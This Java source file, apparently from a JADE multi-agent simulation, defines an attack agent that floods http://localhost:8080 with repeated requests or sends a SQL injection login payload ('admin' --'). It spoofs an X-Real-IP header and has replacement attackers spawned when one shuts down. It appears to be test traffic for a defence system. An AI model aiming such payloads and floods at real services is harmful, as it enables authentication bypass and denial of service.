package agentes;

import jade.core.Agent;
import jade.core.behaviours.OneShotBehaviour;
import jade.core.behaviours.TickerBehaviour;
import jade.lang.acl.ACLMessage;
import jade.domain.DFService;
import jade.domain.FIPAAgentManagement.DFAgentDescription;
import jade.domain.FIPAAgentManagement.ServiceDescription;
import jade.domain.FIPAException;
import jade.domain.FIPANames;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Random;

public class AttackAgent extends Agent {
    private static final int DOS = 0;
    private static final int INJECTION = 1;

    private boolean notifiedCreate = false;
    // Fake IP do atacante, gerado uma única vez
    private final String fakeIp;

    public AttackAgent() {
        // Inicializa fakeIp antes do setup
        this.fakeIp = String.format("10.0.%d.%d", new Random().nextInt(256), new Random().nextInt(256));
    }

    protected void setup() {
        System.out.println(getLocalName() + ": inicializado com IP fake = " + fakeIp);

        // Escolhe tipo de ataque na criação
        int tipoAtaque = new Random().nextInt(2);

        if (tipoAtaque == DOS) {
            System.out.println(getLocalName() + ": Tipo selecionado = DoS");
            // Dispara comportamento DoS (repetitivo)
            addBehaviour(new DosBehaviour(this, 500));
        } else {
            System.out.println(getLocalName() + ": Tipo selecionado = Injection");
            // Dispara comportamento de Injection apenas uma vez
            addBehaviour(new InjectionBehaviour(this, 2000));
        }
    }

    protected void takeDown() {
        if (!notifiedCreate) {
            notifiedCreate = true;
            System.out.println("[ATTACK] " + getLocalName() + " sendo encerrado. Notificando CreateAttackAgent...");
            try {
                DFAgentDescription template = new DFAgentDescription();
                ServiceDescription sd = new ServiceDescription();
                sd.setType("Create-Attack");
                template.addServices(sd);

                DFAgentDescription[] result = DFService.search(this, template);
                if (result.length > 0) {
                    ACLMessage msg = new ACLMessage(ACLMessage.REQUEST);
                    msg.addReceiver(result[0].getName());
                    msg.setProtocol(FIPANames.InteractionProtocol.FIPA_REQUEST);
                    msg.setContent("criar");
                    send(msg);
                    System.out.println("[ATTACK] Mensagem enviada ao CreateAttackAgent.");
                } else {
                    System.out.println("[ATTACK] CreateAttackAgent não encontrado.");
                }
            } catch (FIPAException e) {
                e.printStackTrace();
            }
        }
        super.takeDown();
    }

    /**
     * Comportamento de SQL Injection: roda uma vez
     */
    private class InjectionBehaviour extends TickerBehaviour {
        public InjectionBehaviour(Agent a, long period) {
            super(a, period);
        }
        public void onTick() {
            System.out.println(getAgent().getLocalName() + ": Executando SQL Injection com IP " + fakeIp);
            try {
                URL url = new URL("http://localhost:8080/");  // endpoint raiz
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                con.setRequestMethod("POST");
                con.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                con.setRequestProperty("X-Real-IP", fakeIp);
                con.setDoOutput(true);

                // Payload injetado no JSON
                String jsonPayload = String.format("{\"username\": \"admin' --\", \"password\": \"irrelevante\"}");
                byte[] data = jsonPayload.getBytes(StandardCharsets.UTF_8);

                try (OutputStream os = con.getOutputStream()) {
                    os.write(data);
                }

                int code = con.getResponseCode();
                System.out.println(getAgent().getLocalName() + ": Injection HTTP response code = " + code);

                try (BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()))) {
                    String line;
                    while ((line = in.readLine()) != null) {
                        System.out.println(getAgent().getLocalName() + " [resp] " + line);
                    }
                }
                myAgent.doDelete();
                con.disconnect();
            } catch (Exception e) {
                System.err.println(getAgent().getLocalName() + ": Erro na Injection -> " + e.getMessage());

            }
        }
    }

    /**
     * Comportamento de DoS: envia requisições repetidamente
     */
    private static class DosBehaviour extends TickerBehaviour {
        public DosBehaviour(Agent a, long period) {
            super(a, period);
        }

        protected void onTick() {
            String agentName = myAgent.getLocalName();
            String fakeIp = ((AttackAgent) myAgent).fakeIp;
            System.out.println("[" + agentName + "] Disparando DoS com IP " + fakeIp);
            try {
                URL url = new URL("http://localhost:8080/");
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                con.setRequestMethod("POST");
                con.setRequestProperty("X-Real-IP", fakeIp);

                int code = con.getResponseCode();
                System.out.println("[" + agentName + "] DoS HTTP response code = " + code);
                con.getInputStream().close();
            } catch (Exception e) {
                System.err.println("[" + myAgent.getLocalName() + "] Erro no DoS -> " + e.getMessage());
                stop();
                myAgent.doDelete();
            }
        }
    }
}



// _______________________________________________________________________________________________________________________






